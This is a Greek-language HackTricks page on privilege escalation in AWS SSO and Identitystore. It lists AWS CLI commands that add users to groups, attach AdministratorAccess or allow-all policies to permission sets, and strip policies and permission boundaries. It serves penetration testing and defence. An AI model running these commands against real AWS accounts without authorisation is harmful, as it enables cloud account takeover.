# AWS - Προνόμια Ανέλιξης Στοιχείων SSO & Identitystore

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Κέντρο Ταυτότητας AWS / AWS SSO

Για περισσότερες πληροφορίες σχετικά με το Κέντρο Ταυτότητας AWS / AWS SSO, ελέγξτε:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Σημειώστε ότι από προεπιλογή, μόνο οι **χρήστες** με δικαιώματα **από** τον **Λογαριασμό Διαχείρισης** θα μπορούν να έχουν πρόσβαση και να **ελέγχουν το Κέντρο Ταυτότητας IAM**.\
Οι χρήστες από άλλους λογαριασμούς μπορούν να το επιτρέψουν μόνο εάν ο λογαριασμός είναι **Αναθέτημένος Διαχειριστής**.\
[Ελέγξτε την τεκμηρίωση για περισσότερες πληροφορίες.](https://docs.aws.amazon.com/singlesignon/latest/userguide/delegated-admin.html)
{% endhint %}

### ~~Επαναφορά Κωδικού Πρόσβασης~~

Ένας εύκολος τρόπος να αναβαθμίσετε τα προνόμια σε περιπτώσεις όπως αυτή θα ήταν να έχετε άδεια που επιτρέπει την επαναφορά των κωδικών πρόσβασης των χρηστών. Δυστυχώς, είναι δυνατό μόνο να στείλετε ένα email στον χρήστη για να επαναφέρει τον κωδικό του, οπότε θα χρειαστεί να έχετε πρόσβαση στο email του χρήστη.

### `identitystore:CreateGroupMembership`

Με αυτήν την άδεια είναι δυνατό να ορίσετε έναν χρήστη μέσα σε μια ομάδα, έτσι ώστε να κληρονομεί όλα τα προνόμια που έχει η ομάδα.

{% code overflow="wrap" %}
```bash
aws identitystore create-group-membership --identity-store-id <tore-id> --group-id <group-id> --member-id UserId=<user-id>
```
### `sso:PutInlinePolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να χορηγήσει επιπλέον δικαιώματα σε ένα Permission Set που έχει χορηγηθεί σε έναν χρήστη υπό τον έλεγχό του.
```bash
# Set an inline policy with admin privileges
aws sso-admin put-inline-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --inline-policy file:///tmp/policy.yaml

# Content of /tmp/policy.yaml
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Statement1",
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachManagedPolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να χορηγήσει επιπλέον δικαιώματα σε ένα Permission Set που έχει χορηγηθεί σε έναν χρήστη υπό τον έλεγχό του. 

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-managed-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --managed-policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachCustomerManagedPolicyReferenceToPermissionSet`, `sso:ProvisionPermissionSet`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να χορηγήσει επιπλέον δικαιώματα σε ένα Permission Set που έχει χορηγηθεί σε έναν χρήστη υπό τον έλεγχό του.

{% hint style="warning" %}
Για να καταχραστείτε αυτές τις άδειες σε αυτήν την περίπτωση, πρέπει να γνωρίζετε το **όνομα μιας πολιτικής που διαχειρίζεται ο πελάτης και βρίσκεται σε ΟΛΟΥΣ τους λογαριασμούς** που θα επηρεαστούν.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-customer-managed-policy-reference-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --customer-managed-policy-reference <customer-managed-policy-name>

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:CreateAccountAssignment`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να δώσει ένα Permission Set σε έναν χρήστη υπό τον έλεγχό του σε έναν λογαριασμό.
```bash
aws sso-admin create-account-assignment --instance-arn <instance-arn> --target-id <account_num> --target-type AWS_ACCOUNT --permission-set-arn <permission_set_arn> --principal-type USER --principal-id <principal_id>
```
### `sso:GetRoleCredentials`

Επιστρέφει τα προσωρινά διαπιστευτήρια STS για ένα συγκεκριμένο όνομα ρόλου που έχει ανατεθεί στον χρήστη.

{% code overflow="wrap" %}
```
aws sso get-role-credentials --role-name <value> --account-id <value> --access-token <value>
```
{% endcode %}

Ωστόσο, χρειάζεστε ένα access token το οποίο δεν είμαι σίγουρος πώς να το αποκτήσετε (TODO).

### `sso:DetachManagedPolicyFromPermissionSet`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να αφαιρέσει τη συσχέτιση μεταξύ ενός διαχειριζόμενου πολιτικής της AWS από το συγκεκριμένο σύνολο δικαιωμάτων. Είναι δυνατόν να χορηγηθούν περισσότερα προνόμια μέσω **αποσύνδεσης μιας διαχειριζόμενης πολιτικής (απόρριψη πολιτικής)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-managed-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN> --managed-policy-arn <ManagedPolicyARN>
```
### `sso:DetachCustomerManagedPolicyReferenceFromPermissionSet`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να αφαιρέσει τη συσχέτιση μεταξύ μιας πολιτικής που διαχειρίζεται ο πελάτης από το συγκεκριμένο σύνολο δικαιωμάτων. Είναι δυνατόν να χορηγηθούν περισσότερα προνόμια μέσω **αποσύνδεσης μιας διαχειριζόμενης πολιτικής (απόρριψη πολιτικής)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-customer-managed-policy-reference-from-permission-set --instance-arn <value> --permission-set-arn <value> --customer-managed-policy-reference <value>
```
### `sso:DeleteInlinePolicyFromPermissionSet`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να αφαιρέσει τις άδειες από μια ενσωματωμένη πολιτική από το σύνολο άδειών. Είναι δυνατόν να χορηγηθούν **περισσότερα προνόμια μέσω της αποσύνδεσης μιας ενσωματωμένης πολιτικής (απόρριψη πολιτικής)**.

{% code overflow="wrap" %}
```bash
aws sso-admin delete-inline-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN>
```
### `sso:DeletePermissionBoundaryFromPermissionSet`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να αφαιρέσει το Όριο Άδειας από το σύνολο άδειας. Είναι δυνατόν να χορηγηθούν **περισσότερα προνόμια αφαιρώντας τους περιορισμούς από το Σύνολο Άδειας** που δίνονται από το Όριο Άδειας.

{% endcode %}
```bash
aws sso-admin   delete-permissions-boundary-from-permission-set --instance-arn <value> --permission-set-arn <value>
```
{% endcode %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
